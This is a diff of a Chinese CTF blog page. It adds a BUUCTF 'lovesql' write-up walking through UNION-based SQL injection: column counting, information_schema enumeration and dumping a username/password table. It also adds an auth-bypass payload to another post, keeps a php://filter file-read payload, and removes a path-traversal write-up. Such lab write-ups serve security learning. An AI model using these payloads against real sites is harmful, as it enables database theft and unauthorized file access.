@@ -169,6 +169,111 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-love" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/25/love/" class="article-date">
+  	<time datetime="2021-01-25T08:12:19.000Z" itemprop="datePublished">2021-01-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/25/love/">
+        11-buu练习lovesql
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开题目链接。界面如下；<br><img src="/2021/01/25/love/love1.png"><br>尝试使用万能密码：</p>
+<ul>
+<li>用户名：1' or 1=1#
+</li><li>密码：222（任意三个数）
+</li></ul>
+跳转到check.php界面：
+
+<p><img src="/2021/01/25/love/love2.png"></p>
+<p>得到了用户名和密码<br>开始注入<br>在url中输入；</p>
+<ul>
+<li>1./check.php?username=admin' order by 3%23&password=1     存在
+</li><li>2./check.php?username=admin' order by 4%23&password=1     存在
+</li><li>3./check.php?username=admin' order by 3%23&password=1     存在
+</li><li>4./check.php?username=admin' order by 4%23&password=1     报错
+</li></ul>
+注意：由于是在url中输入的内容，所以不能用#，而用它的url编码%23。
+输入4时界面如下：
+
+<p><img src="/2021/01/25/love/love3.png"></p>
+<p>由此可知，有3个字段。用union查询测试注入点（回显点位）：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,3%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love4.png"></p>
+<p>回显点位是2和3，查询数据库名及版本：</p>
+<ul>
+<li>/check.php?username=1' union select 1,database(),version()%23&password=1
+</li></ul>
+可知用户名为：geek
+接下来爆表：
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love6.png"></p>
+<p>爆出geekyser和l0ve1ysq1两个表，我们试一下geekuser这个表：<br>爆字段：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love7.png"></p>
+<p>得到三个字段：id，username，password。<br>爆数据：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love8.png"></p>
+<p><img src="/2021/01/25/love/love9.png"></p>
+<p>得到flag！<br>被sql支配的一天</p>
+<p><img src="/2021/01/25/love/love10.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -198,7 +303,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目链接，如下：<br><img src="/2021/01/24/sql/sql2.png"><br>尝试万能密码，竟然真的出来了！<br><img src="/2021/01/24/sql/sql1.png"><br>真是轻松的一天！（难得啊）</p>
+        <p>打开题目链接，如下：<br><img src="/2021/01/24/sql/sql2.png"><br>尝试万能密码：<br>用户名–&gt;admin；<br>密码–&gt;1’or’1’=’1<br><img src="/2021/01/24/sql/sql1.png"><br>竟然真的出来了<br>真是轻松的一天！（难得啊）</p>
 <h2>接下来总结一下万能密码：</h2>
 <h3>aspx万能密码</h3>
 <table border="1">
@@ -930,62 +1035,6 @@ X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连�
     <div class="article-entry" itemprop="articleBody">
       
         <p>打开题目点击tips进入以下界面<br><img src="/2021/01/16/include1/bbb0.png"><br>从url可以看出是文件包含的题型，考虑php伪协议（具体内容可见霸霸童鞋博客；php伪协议笔记）<br>首先使用 <b>“php://input”伪协议 + POST发送PHP代码</b> 经典套路<br><img src="/2021/01/16/include1/bbb1.png"><br>可知php://input伪协议被过滤了<br>那么用 <b>php://filter</b> 伪协议来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行，那么对其进行编码，阻止其不执行，从而读取任意文件。<br>经典payload：<b>?file=php://filter/read=convert.base64-encode/resource=flag.php</b>–&gt;（read=convert.base64-encode来对文件内容进行编码,发送请求读取base64编码后的flag.php文件源码）<br>结果如下：<br><img src="/2021/01/16/include1/bbb2.png"><br>对base64编码进行解码<br><img src="/2021/01/16/include1/bbb3.png"><br>得到flag~</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-phpshenji" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/15/phpshenji/" class="article-date">
-  	<time datetime="2021-01-15T13:48:54.000Z" itemprop="datePublished">2021-01-15</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/15/phpshenji/">
-        1-php审计buu第一题
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开题目链接，是一幅图片，我们查看源代码<br><img src="/2021/01/15/phpshenji/ppp2.png"><br>题目地址是source.php，输入地址后代码如下：<br><img src="/2021/01/15/phpshenji/ppp3.png"><br>由<br>$whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];<br>得到另一个地址/hint.php，打开后看到如下界面<br><img src="/2021/01/15/phpshenji/ppp1.png"><br>继续查看source.php代码<br><img src="/2021/01/15/phpshenji/ppp4.png"><br>这段代码告诉们需要满足三个条件</p>
-<p>1.值为非空<br>2.值为字符串<br>3.能够通过checkFile()函数校验<br>否则打印滑稽<br>查看checkfile()函数–&gt;highlight_file()函数<br><img src="/2021/01/15/phpshenji/ppp5.png"><br>其中包含4个if语句：<br>1.第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>2.第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>3.第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>4.第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>————————<br>若以上四个if语句均未返回值，则返回false<br>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br><a target="_blank" rel="noopener" href="http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a><br>即可得到flag：<br><img src="/2021/01/15/phpshenji/ppp6.png"></p>
 
       
     </div>
